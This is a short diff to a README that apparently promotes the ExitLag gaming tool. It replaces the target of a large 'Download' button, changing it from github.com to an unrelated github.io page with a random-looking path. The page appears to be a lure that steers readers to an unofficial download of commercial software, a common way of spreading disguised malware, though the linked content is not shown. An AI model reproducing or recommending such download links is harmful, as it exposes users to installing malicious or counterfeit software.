@@ -19,7 +19,7 @@ Low ping with ExitLag — Stable connection and less latency. ExitLag is ideal f
 
 Get ExitLag and enjoy games without interruptions with reduced ping. Improve your gaming speed.
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://ulnecto.github.io/id/sg56s90l"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
